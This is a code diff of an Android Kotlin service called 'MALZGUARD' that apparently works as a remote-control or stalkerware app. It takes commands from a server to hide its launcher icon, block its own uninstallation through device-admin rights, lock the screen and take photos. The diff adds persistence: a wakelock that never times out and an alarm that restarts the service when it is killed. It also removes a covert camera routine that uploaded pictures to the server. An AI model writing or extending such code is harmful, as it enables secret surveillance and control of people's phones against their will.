@@ -5,8 +5,6 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.hardware.camera2.*
-import android.media.ImageReader
 import android.os.*
 import android.provider.Settings
 import android.net.Uri
@@ -23,8 +21,6 @@ class Svc : Service() {
     private var id = ""
     private val server = Config.SERVER
     private var wakeLock: PowerManager.WakeLock? = null
-    private var camThread: HandlerThread? = null
-    private var camHandler: Handler? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -37,15 +33,33 @@ class Svc : Service() {
             }
             val n = Notification.Builder(this, "mg").setContentTitle("MALZGUARD").setContentText("Service running").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
             startForeground(1, n)
-            try { val pm = getSystemService(POWER_SERVICE) as PowerManager; wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MALZGUARD::wl"); wakeLock?.acquire(10 * 60 * 1000L) } catch (e: Exception) {}
-            camThread = HandlerThread("cam").also { it.start() }
-            camHandler = Handler(camThread!!.looper)
+            try { val pm = getSystemService(POWER_SERVICE) as PowerManager; wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MALZGUARD::wl"); wakeLock?.setReferenceCounted(false); wakeLock?.acquire() } catch (e: Exception) {}
         } catch (e: Exception) {}
         running = true
         Thread { loop() }.start()
     }
 
-    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
+    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
+        try {
+            if (Build.VERSION.SDK_INT >= 26) {
+                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+                val n = Notification.Builder(this, "mg").setContentTitle("MALZGUARD").setContentText("Service running").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
+                startForeground(1, n)
+            }
+        } catch (e: Exception) {}
+        if (!running) { running = true; Thread { loop() }.start() }
+        return START_STICKY
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        try {
+            val restart = Intent(applicationContext, Svc::class.java)
+            val pi = PendingIntent.getService(applicationContext, 1, restart, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT)
+            val am = getSystemService(ALARM_SERVICE) as AlarmManager
+            am.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, pi)
+        } catch (e: Exception) {}
+        super.onTaskRemoved(rootIntent)
+    }
 
     private fun loop() {
         while (running) {
@@ -74,23 +88,6 @@ class Svc : Service() {
             c.connectTimeout = 10000; c.readTimeout = 15000; c.requestMethod = "POST"; c.doOutput = true
             c.setRequestProperty("Content-Type", "application/json")
             c.outputStream.use { it.write(body.toByteArray()) }
-            val code = c.responseCode
-            val s = if (code in 200..299) c.inputStream else c.errorStream
-            val text = s?.bufferedReader()?.use { it.readText() }; c.disconnect(); return text
-        } catch (e: Exception) { return null }
-    }
-
-    private fun httpUpload(path: String, bytes: ByteArray, name: String): String? {
-        try {
-            val boundary = "----MG" + System.currentTimeMillis()
-            val c = URL(path).openConnection() as HttpURLConnection
-            c.connectTimeout = 15000; c.readTimeout = 30000; c.requestMethod = "POST"; c.doOutput = true
-            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-            val os = c.outputStream
-            os.write(("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"$name\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray())
-            os.write(bytes)
-            os.write(("\r\n--$boundary--\r\n").toByteArray())
-            os.flush()
             val code = c.responseCode
             val s = if (code in 200..299) c.inputStream else c.errorStream
             val text = s?.bufferedReader()?.use { it.readText() }; c.disconnect(); return text
@@ -142,7 +139,7 @@ class Svc : Service() {
                     "custom lock shown"
                 }
                 "unlock" -> {
-                    val i = Intent(this, LockOverlay::class.java)
+                    val i = Intent(this, UnlockHelper::class.java)
                     i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     startActivity(i)
                     "unlock sent"
@@ -176,62 +173,22 @@ class Svc : Service() {
                 "show_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); "shown" }
                 "uninstall_block" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin" }
                 "uninstall_unblock" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin" }
-                "take_photo" -> { takePhoto(a.optString("facing", "back")); "photo requested" }
+                "take_photo" -> {
+                    val facing = a.optString("facing", "back")
+                    val i = Intent(this, CamActivity::class.java)
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    i.putExtra("facing", facing)
+                    startActivity(i)
+                    "camera launched"
+                }
                 else -> "unknown"
             }
         } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
     }
 
-    private fun takePhoto(facing: String) {
-        try {
-            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
-            val camId = cm.cameraIdList.firstOrNull { cid ->
-                val ch = cm.getCameraCharacteristics(cid)
-                val f = ch.get(CameraCharacteristics.LENS_FACING)
-                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
-            } ?: cm.cameraIdList.firstOrNull() ?: return
-            val ch = cm.getCameraCharacteristics(camId)
-            val sz = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull() ?: return
-            val reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
-            val handler = camHandler ?: Handler(Looper.getMainLooper())
-            reader.setOnImageAvailableListener({ r ->
-                try {
-                    val img = r.acquireLatestImage()
-                    val buf = img?.planes?.get(0)?.buffer
-                    if (buf != null) {
-                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
-                        httpUpload("$server/api/upload/$id/photo", bytes, "cam_${System.currentTimeMillis()}.jpg")
-                    }
-                    img?.close()
-                    r.close()
-                } catch (e: Exception) {}
-            }, handler)
-            cm.openCamera(camId, object : CameraDevice.StateCallback() {
-                override fun onOpened(cam: CameraDevice) {
-                    try {
-                        cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(s: CameraCaptureSession) {
-                                try {
-                                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-                                    req.addTarget(reader.surface)
-                                    s.capture(req.build(), null, handler)
-                                    handler.postDelayed({ try { cam.close() } catch (e: Exception) {} }, 3000)
-                                } catch (e: Exception) { try { cam.close() } catch (e2: Exception) {} }
-                            }
-                            override fun onConfigureFailed(s: CameraCaptureSession) { try { cam.close() } catch (e: Exception) {} }
-                        }, handler)
-                    } catch (e: Exception) { try { cam.close() } catch (e2: Exception) {} }
-                }
-                override fun onDisconnected(cam: CameraDevice) { try { cam.close() } catch (e: Exception) {} }
-                override fun onError(cam: CameraDevice, e: Int) { try { cam.close() } catch (e: Exception) {} }
-            }, handler)
-        } catch (e: Exception) {}
-    }
-
     override fun onDestroy() {
         running = false
         try { wakeLock?.release() } catch (e: Exception) {}
-        try { camThread?.quitSafely() } catch (e: Exception) {}
         super.onDestroy()
     }
     override fun onBind(i: Intent?): IBinder? = null
